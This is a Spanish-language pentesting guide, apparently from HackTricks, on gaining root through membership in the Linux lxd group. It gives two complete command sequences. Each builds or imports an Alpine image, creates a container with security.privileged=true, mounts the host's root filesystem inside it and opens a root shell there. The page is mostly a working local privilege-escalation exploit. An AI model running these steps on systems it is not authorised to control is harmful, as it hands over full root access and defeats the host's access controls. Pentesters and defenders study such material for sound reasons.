# lxd/lxc Group - Escalada de privilegios

{{#include ../../../banners/hacktricks-training.md}}

La pertenencia al grupo de administración de LXD del host (normalmente _**lxd**_) puede proporcionar una vía para obtener root al permitir el control total del daemon.<sup>[[1]](#references)</sup>

## Explotación sin internet

### Method 1

Puedes descargar una imagen de Alpine para usarla con LXD desde un repositorio de confianza.  
El servidor de imágenes de LXD de Canonical publica compilaciones diarias: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
Solo tienes que descargar **lxd.tar.xz** y **rootfs.squashfs** de la compilación más reciente (el nombre del directorio es la fecha).<sup>[[8]](#references)</sup>

Como alternativa, puedes instalar distrobuilder en tu máquina siguiendo las [instrucciones del proyecto](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Sube **incus.tar.xz** (**lxd.tar.xz** si lo descargaste del servidor de imágenes de Canonical) y **rootfs.squashfs**, luego importa la imagen y crea un contenedor.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
> Run **`lxd init`**, set up a default storage pool, then **repeat** the previous chunk of commands.<sup>[[2]](#references)</sup>

Finalmente, inicia el container y abre un shell de root en el filesystem del host:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Método 2

Construye una imagen Alpine e iníciala con el flag `security.privileged=true`, que asigna el root del contenedor al root del host; montar `/` expone entonces el sistema de archivos del host dentro del contenedor.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Cómo reforzar la seguridad de LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Contenedores y máquinas virtuales de LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Cómo copiar e importar imágenes](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Cómo crear imágenes con distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definición de imagen de Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script de compilación de lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Servidor de imágenes de LXD](https://images.lxd.canonical.com/)
- [9] [Tipo: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
